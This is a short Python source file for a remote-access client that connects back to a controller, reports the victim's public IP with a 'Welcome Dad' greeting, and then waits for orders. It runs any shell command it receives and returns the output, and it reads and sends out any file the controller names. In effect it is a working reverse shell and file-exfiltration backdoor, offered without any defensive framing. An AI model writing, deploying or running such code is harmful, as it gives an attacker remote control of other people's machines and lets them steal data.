# -*- coding: utf-8 -*-

import socket
import os
import subprocess
from time import sleep
import json
from urllib import request

IP = socket.gethostbyname("localhost")
PORT = 80

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((IP, int(PORT)))

class Client:
	def __init__(self, DATA):
		self.DATA = DATA

	def verifications(DATA):
		if(DATA == str.encode("command")):
			command = s.recv(1024)
			Client.command(command.decode("utf-8"))

		if(DATA == str.encode("home")):
			s.send(os.getcwd().encode())

		if(DATA == str.encode("exit")):
			s.close()
			exit()

		if(DATA == str.encode("filesend")):
			Client.send_archive(DATA)


	def get_ip():
		url = request.urlopen('http://ip-api.com/json').read()
		jsn = json.loads(url.decode('UTF-8'))
		ip = jsn['query']

		return(ip)

	def command(DATA):
		sub = subprocess.Popen(DATA, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
		output = sub.stderr.read()+sub.stdout.read()
		s.send(output)

	def send_archive(DATA):
		filename = s.recv(1024).decode("utf-8")

		with open(filename, "rb") as infile:
			#filesize = str(os.path.getsize(filename)).zfill(16)
			#s.send(filesize.encode())
			#sleep(1)

			chunk = infile.read(128*1024)
			s.send(chunk)

s.send(str.encode(f"Welcome Dad \nI`m {Client.get_ip()}\n\n"))

while True:
	try:
		rcvc = s.recv(1024)
		Client.verifications(rcvc)

	except KeyboardInterrupt:
		s.close()
		exit()
